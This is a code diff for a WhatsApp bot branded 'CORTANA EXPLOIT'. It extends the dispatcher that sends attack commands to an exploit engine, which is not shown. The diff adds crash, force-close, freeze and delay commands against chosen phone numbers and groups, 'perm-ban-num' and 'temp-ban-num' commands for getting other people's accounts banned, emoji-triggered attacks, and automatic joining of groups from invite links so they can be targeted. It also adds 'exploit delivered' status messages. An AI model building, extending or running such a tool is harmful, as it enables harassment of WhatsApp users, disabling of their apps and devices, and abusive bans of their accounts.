@@ -587,53 +587,57 @@ ${(originalMsg.message.imageMessage || originalMsg.message.videoMessage) ? '(med
 
           // Helper to check for command
           const isCmd = text.startsWith(PREFIX);
-          const command = isCmd ? text.slice(PREFIX.length).trim().split(' ')[0].toLowerCase() : '';
+          const command = isCmd ? text.slice(PREFIX.length).trim().split(' ')[0] : ''; // Don't lowercase - emojis are case-sensitive
+          const commandLower = command.toLowerCase();
           const args = text.trim().split(' ').slice(1);
           const q = args.join(" ");
 
           // Menu Command
-          if (isCmd && (command === 'menu' || command === 'help' || command === 'start')) {
+          if (isCmd && (commandLower === 'menu' || commandLower === 'help' || commandLower === 'start')) {
             const uptime = process.uptime();
-            // Simple uptime formatting
             const hours = Math.floor(uptime / 3600);
             const minutes = Math.floor((uptime % 3600) / 60);
             const seconds = Math.floor(uptime % 60);
             const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;
 
-            const menuText = `@@        CORTANA EXPLOIT        @@
-@@         ☠ DEATH EDITION ☠         @@
-@@     CREATOR: EDUXEYOO THE KING     @@
-@@         UPTIME: ${uptimeStr}         @@
-@@ __________________________________ @@
+            // Calculate Greeting with emojis
+            const hour = new Date().getHours();
+            let greeting = "🌙 Good Night";
+            if (hour >= 5 && hour < 12) greeting = "🌅 Good Morning";
+            else if (hour >= 12 && hour < 18) greeting = "☀️ Good Afternoon";
+            else if (hour >= 18 && hour < 22) greeting = "🌆 Good Evening";
 
-- ☠🦠  MENU – ENTER IF YOU DARE  🦠☠
+            const pushName = msg.pushName || "Hacker";
+            const greetingFull = greeting + ", " + pushName + "!";
 
-+          💉 CRASH CHAMBER
-+ .forclose-invis
-+ .forclose-call  
-+ .forclosexdelay
-+ .crash         
-+ .crashxdelay   
-+ .crash-invis   
-+ .blankstc      
-+ .delay-invis   
-+ .freez-stuck   
+            // Load menu from file (same pattern as MD bot)
+            let menuText = "";
+            const possiblePaths = [
+              path.join(__dirname, "bug-menu.txt"),
+              path.join(__dirname, "..", "bug-menu.txt"),
+              path.join(process.cwd(), "server", "bug-menu.txt"),
+              path.join(process.cwd(), "dist", "bug-menu.txt")
+            ];
 
-+          ☠ GC DEATH ROW
-+ .dor    
-+ .🥱     
-+ .xgc    
+            for (const menuPath of possiblePaths) {
+              try {
+                if (fs.existsSync(menuPath)) {
+                  menuText = fs.readFileSync(menuPath, "utf-8");
+                  console.log("[BUG-MENU] Loading from:", menuPath);
+                  break;
+                }
+              } catch (e) {
+                // Continue to next path
+              }
+            }
 
-+          🦠 BAN EXPLOIT 🦠
-+ .perm-ban-num ↳ number (628xxx)
-+ .temp-ban-num ↳ number (628xxx)  
-+ .gc-death-link ↳ send/reply group link
-+ .ch-death-id ↳ reply channel post / send ID
+            if (!menuText) {
+              menuText = "☠️ CORTANA EXPLOIT ☠️\n\nMenu file not found. Type .crash <number> to execute.";
+            }
 
-- 🩸 TYPE WRONG... AND YOU'RE NEXT 🩸
-- EDUXEYOO OWNS THIS REALM NOW
-
-☠ CORTANA EXPLOIT 🖤`;
+            // Replace placeholders
+            menuText = menuText.replace("{{UPTIME}}", uptimeStr);
+            menuText = menuText.replace("{{GREETING}}", greetingFull);
 
             await sock.sendMessage(jid, {
               image: { url: "https://files.catbox.moe/rras91.jpg" },
@@ -642,24 +646,71 @@ ${(originalMsg.message.imageMessage || originalMsg.message.videoMessage) ? '(med
             continue;
           }
 
-          // Execute Exploit Commands
+          // Execute Exploit Commands - FULL LIST from exploit-engine.ts
           if (isCmd) {
-            // Pass to exploit engine. 
-            // We pass the args/target if needed. For commands like .crash, the target is usually the current chat 
-            // OR a mentioned user. 
-            // exploit-engine executeExploit(sock, command, target) expects target JID.
+            // ALL exploit commands supported by exploit-engine.ts
+            const exploitCommands = [
+              // Crash commands
+              'crash', 'crash-invis', 'crash-ios',
+              // Forclose commands
+              'forclose', 'forclose-invis', 'forclose-call', 'forclosexdelay',
+              // Freeze/Delay commands
+              'frezee-ios', 'blank-ios', 'delay-invis', 'crashxdelay', 'blankstc', 'frezee-stuck',
+              // Group commands
+              'dor', 'dorr', 'xgc', 'crash-gc', 'frezee-gc', 'blank-gc',
+              // Ban commands
+              'perm-ban-num', 'temp-ban-num',
+              // Emoji commands
+              '🩸', '🗿', '🥱', '😹', '😈', '👾', '🔥', '💦', '🌷', '🌹'
+            ];
 
-            // If the command is one of the known exploits, execute it on the current chat or specified target.
-            const exploitCommands = ['crash', 'crash-invis', 'crash-ios', 'forclose', 'forclose-invis', 'forclose-call', 'crashxdelay', 'blankstc', 'dor', 'xgc', 'perm-ban-num', 'temp-ban-num'];
-
-            if (exploitCommands.includes(command)) {
-              // For bans/remote attacks, user might supply number
+            if (exploitCommands.includes(command) || exploitCommands.includes(commandLower)) {
+              // Determine target
               let target = jid;
               if (q) {
-                target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+                // Check if it's a group link
+                if (q.includes('chat.whatsapp.com')) {
+                  // Extract group JID from link
+                  const code = q.split('/').pop();
+                  try {
+                    const groupInfo = await sock.groupAcceptInvite(code!);
+                    target = groupInfo + "@g.us";
+                  } catch {
+                    // If can't join, try to use as-is
+                    target = q;
+                  }
+                } else if (q.includes('@g.us')) {
+                  target = q;
+                } else {
+                  // It's a phone number
+                  target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+                }
               }
 
-              await executeExploit(sock, command, target);
+              console.log(`[EXPLOIT] Executing ${command} on ${target}`);
+
+              // Send executing message
+              await sock.sendMessage(jid, {
+                text: `☠️ *EXECUTING ${command.toUpperCase()}*\n\n🎯 Target: ${target.split('@')[0]}\n⏳ Please wait...`
+              });
+
+              try {
+                const result = await executeExploit(sock, command, target);
+                if (result) {
+                  await sock.sendMessage(jid, {
+                    text: `✅ *${command.toUpperCase()} COMPLETED*\n\n🎯 Target: ${target.split('@')[0]}\n💀 Exploit delivered successfully!`
+                  });
+                } else {
+                  await sock.sendMessage(jid, {
+                    text: `⚠️ *${command.toUpperCase()} WARNING*\n\nExploit may have partially executed. Check target status.`
+                  });
+                }
+              } catch (error: any) {
+                console.error(`[EXPLOIT] Error executing ${command}:`, error);
+                await sock.sendMessage(jid, {
+                  text: `❌ *EXPLOIT FAILED*\n\nError: ${error.message || 'Unknown error'}`
+                });
+              }
             }
           }
         }
